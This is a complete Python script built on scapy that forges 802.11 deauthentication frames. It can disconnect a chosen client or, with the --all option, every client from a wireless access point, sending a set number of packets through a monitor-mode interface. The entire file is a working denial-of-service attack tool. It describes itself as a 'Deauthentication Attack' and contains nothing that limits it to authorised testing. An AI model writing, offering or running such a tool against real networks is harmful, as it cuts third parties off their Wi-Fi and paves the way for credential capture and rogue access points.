import os
import argparse
from scapy.all import *

# Set up command-line argument parsing
parser = argparse.ArgumentParser(description="Send deauthentication packets")
parser.add_argument("-t", "--target", help="Target MAC address", required=False)
parser.add_argument("-g", "--gateway", help="Gateway (AP) MAC address", required=True)
parser.add_argument("-n", "--num-packets", help="Number of packets to send", type=int, required=True)
parser.add_argument("-i", "--interface", help="Interface to use (e.g., wlan1mon)", required=True)
parser.add_argument("-r", "--reason", help="Reason code for deauthentication", type=int, default=7)
parser.add_argument("--all", help="Deauthenticate all clients on the AP", action="store_true")
args = parser.parse_args()

# Print header
print("Starting Deauthentication Attack")
if args.all:
    print("Target: All Clients")
else:
    print(f"Target: {args.target}")
print(f"Gateway: {args.gateway}")
print(f"Interface: {args.interface}")
print(f"Reason Code: {args.reason}")
print("-" * 40)

# Determine target MAC address
target_mac = "ff:ff:ff:ff:ff:ff" if args.all else args.target

# Check if target MAC address is specified when not using --all
if not args.all and not args.target:
    print("Error: Please specify a target MAC address or use --all option.")
    parser.print_help()
    exit(1)

# Loop to send the specified number of deauth packets
for i in range(args.num_packets):
    # Construct the deauth packet
    dot11 = Dot11(addr1=target_mac, addr2=args.gateway, addr3=args.gateway)
    packet = RadioTap() / dot11 / Dot11Deauth(reason=args.reason)
    sendp(packet, inter=0.1, count=1, iface=args.interface, verbose=0)
    target_description = 'all clients' if args.all else args.target
    print(f"Packet {i + 1}/{args.num_packets} sent to {target_description} with reason code {args.reason}.")

# Indicate completion
print("-" * 40)
print("Deauthentication attack complete.")
